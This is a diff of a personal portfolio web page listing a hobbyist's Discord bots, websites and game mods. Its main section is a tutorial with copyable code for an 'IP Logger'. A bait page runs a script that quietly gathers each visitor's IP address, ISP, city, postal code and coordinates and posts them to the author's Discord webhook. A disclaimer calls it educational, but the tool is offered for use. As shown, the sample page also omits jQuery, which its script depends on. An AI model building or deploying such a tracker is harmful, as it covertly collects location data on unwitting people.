@@ -1,36 +1,221 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Under Maintenance</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #2c3e50;
-            font-family: 'Arial', sans-serif;
-        }
-
-        h1 {
-            font-size: 3rem;
-            color: #ecf0f1;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
-        }
-
-        p {
-            font-size: 1.5rem;
-            color: #ecf0f1;
-        }
-    </style>
+  <title>Jox</title>
+  <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <div>
-        <h1>Site Under Maintenance</h1>
-        <p>We are currently working on improving the site. Please check back soon.</p>
+  <header>
+    <h1>Things I waste my time on</h1>
+  </header>
+  <main>
+    <section>
+      <h2>Discord Projects</h2>
+      <div class="accordion">
+        <button class="accordion-btn">Bots</button>
+        <div class="accordion-content">
+          <p>Welcoming Bot <br>
+             NSFW Bot <br>
+             Moderation Bot
+          </p>
+        </div>
+        <button class="accordion-btn">Weebhook IP Logger</button>
+        <div class="accordion-content">
+           <p>
+            As the developer of this tool, it is important to emphasize responsible and ethical use. This proof of concept is intended for educational purposes and to showcase the functionality of Discord webhooks.
+
+I strongly discourage any misuse or unauthorized use of this tool. It is essential to adhere to legal and ethical guidelines when using any software or application. Using this tool for malicious purposes, such as DDoS attacks, is strictly prohibited.
+
+I take no responsibility for any misuse or unauthorized actions taken by individuals who choose to utilize this tool. It is the user's responsibility to ensure that they have proper authorization and comply with applicable laws and regulations.
+
+Please use this concept responsibly and ethically, and respect the rights and privacy of others. <br>-Jox
+           </p>
+          <p><h4>What you need</h4><br>
+            <dl>
+                 <dt>1-</dt>
+                  <dd>First, make sure you have a Discord account. If you don't have one, you can create it by visiting the Discord website and following the sign-up process.</dd><br>
+                 <dt>2-</dt>
+                  <dd> Once you have your Discord account, set up the server where you want to receive the information. You can either create a new server or use an existing one. If you choose to create a new server, follow the instructions on Discord to set it up. If you prefer to use an existing server, make sure you have the necessary permissions to create and manage webhooks.</dd><br>
+                 <dt>3-</dt>
+                  <dd>In your Discord server, click on "Integrations" in the server settings menu. Then, click on "Webhooks" and choose "New Webhook" to create a new webhook.</dd><br>
+                 <dt>4-</dt>
+                  <dd> Now you can customize your webhook by giving it a name and adding a profile picture if you want. After that, you need to assign the webhook to the desired channel where you want to receive the information. This can be a public channel that anyone can access or a private channel that only specific members can view.</dd><br>
+                 <dt>5-</dt>
+                  <dd> Once you have created the webhook and assigned it to the channel, you will be provided with a unique webhook URL. Copy this URL.</dd><br>
+                 <dt>6-</dt>
+                 <dd> Open the script.js file of your website. Look for the appropriate place to add the webhook URL. Paste the copied webhook URL in the designated location in the script.js file.</dd><br>
+                 <dt>7-</dt>
+                 <dd>Finally, save the changes in the script.js file. To activate the webhook and start receiving the specified information, you need to refresh the page or click the link to your website.</dd><br>
+            </dl>
+            Now you are done! All you need to do is refresh the page or click the link to your website and all of the specified information will be sent to the server on the channel you assign on step 4.
+          </p>
+          <p> 
+            <div class="box">
+              <!--index.html-->
+              <pre>
+                <h4>index.html</h4>
+                <code class="language-html lines- numbers" data-prismjs-copy="Copy Code">
+  &lt;!DOCTYPE html&gt;
+  &lt;html&gt;
+    &lt;head&gt;
+      &lt;title&gt;IP Logger&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+    &lt;p&gt;Your IPaddress has been logged
+    and sent to a dicsord server using a webhook.
+    &lt;/p&gt;
+    &lt;script src="script.js"&gt;&lt;/script&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;
+                </code>
+              </pre>
+            </div>
+              <!-- end index.html-->
+              <div class="box">
+                <!--script.js-->
+                <pre>
+                  <h4>script.js</h4>
+                  <code class="language-js lines- numbers" data-prismjs-copy="Copy Code">
+                    $(document).ready(function() {
+                      // Get user information using IPAPI
+                      $.get("https://ipapi.co/json/", function(data) {
+                          // Send user information to Discord webhook
+                          var formattedData = "**IP: **" + data.ip + "\n" +
+                                              "**Network: **" + data.network + "\n" +
+                                              "**Version: **" + data.version + "\n" +
+                                              "**ASN: **" + data.asn + "\n" +
+                                              "**ISP: **" + data.org + "\n" +
+                                              "**City: **" + data.city + "\n" +
+                                              "**Postal Code: **" + data.postal + "\n" +
+                                              "**Region: **" + data.region + "\n" +
+                                              "**Country: **" + data.country_name + "\n" +
+                                              "**Capital: **" + data.country_capital + "\n" +
+                                              "**Country Population: **" + data.country_population + "\n" +
+                                              "**Calling Code: **" + data.country_calling_code + "\n" +
+                                              "**Latitude: **" + data.latitude + "\n" +
+                                              "**Longitude: **" + data.longitude + "\n" +
+                                              "**Timezone: **" + data.timezone + "\n" +
+                                              "**Currency: **" + data.currency + "\n";
+                    
+                          $.ajax({
+                              type: "POST",
+                              url: "https://discord.com/api/webhooks/your-webhook-url",
+                              data: JSON.stringify({ content: formattedData }),
+                              contentType: "application/json"
+                          });
+                      });
+                    });
+                  </code>
+                </pre>
+              </div>
+          </p>
+        </div>
+        <button class="accordion-btn">Costume Messages</button>
+        <div class="accordion-content">
+          <form id="webhook-form">
+            <label for="webhook-input">Discord Webhook:</label>
+            <input type="text" id="webhook-input" name="webhook" required>
+            <br>
+            <label for="message-input">Message:</label>
+            <textarea id="message-input" name="message" rows="4" cols="50" required></textarea>
+            <br>
+            <label for="type-select">Type:</label>
+            <select id="type-select" name="type" required>
+              <option value="text">Text</option>
+              <option value="embed">Embed</option>
+            </select>
+            <br>
+            <label for="title-input">Title:</label>
+            <input type="text" id="title-input" name="title">
+            <br>
+            <label for="color-input">Color:</label>
+            <input type="color" id="color-input" name="color">
+            <br>
+            <input type="submit" value="Send">
+          </form>
+      
+          <script>
+            document.getElementById('webhook-form').addEventListener('submit', function(event) {
+              event.preventDefault();
+              var webhook = document.getElementById('webhook-input').value;
+              var message = document.getElementById('message-input').value;
+              var type = document.getElementById('type-select').value;
+              var title = document.getElementById('title-input').value;
+              var color = document.getElementById('color-input').value;
+      
+              if (type === 'text') {
+                var payload = { content: message };
+              } else {
+                var embed = {
+                  "title": title,
+                  "color": parseInt(color.substr(1), 16),
+                  "description": message
+                };
+                var payload = { embeds: [embed] };
+              }
+      
+              var xhr = new XMLHttpRequest();
+              xhr.open('POST', webhook);
+              xhr.setRequestHeader('Content-Type', 'application/json');
+              xhr.send(JSON.stringify(payload));
+      
+              // Clear the form
+              document.getElementById('webhook-input').value = '';
+              document.getElementById('message-input').value = '';
+              document.getElementById('type-select').value = 'text';
+              document.getElementById('title-input').value = '';
+              document.getElementById('color-input').value = '#4CAF50';
+            });
+          </script>
+
+          
+        </div>
+      </div>
+
+    
+    </section>
+    <section>
+      <h2>Misc</h2>
+      <div class="accordion">
+        <button class="accordion-btn">Life Path Number Calculator</button>
+        <div class="accordion-content">
+          <p>Life Number  : written with c++
+          </p>
+        </div>
+        <button class="accordion-btn">ios</button>
+        <div class="accordion-content">
+          <p>Zeppling Logos : megalink <br>
+            IAP Store : megalink
+          </p>
+        </div>
+        <button class="accordion-btn">Websites</button>
+          <div class="accordion-content">
+            <p>Natalies Project <br>
+               Barrcaks Website <br>
+               DCUO ungreatful league website
+            </p>
+          </div>
+          <button class="accordion-btn">PC Mods</button>
+          <div class="accordion-content">
+            <p>Lethal Company infinite money</p>
+          </div>
+    </section>
+
+  </main>
+  <script src="script.js"></script>
+  <footer>
+    <div class="footer-container">
+      <div class="business-card">
+        <img src="pics/skull.jpg" alt="Profile Picture">
+        <h2>Jox</h2>
+        <p>Another John Doe</p>
+      </div>
+      <div class="contact-info">
+        <h3>Contact Me</h3>
+        <p>Discord: j.ox</p>
+        <p>Github: j-ox</p>
+      </div>
     </div>
+  </footer>
 </body>
 </html>
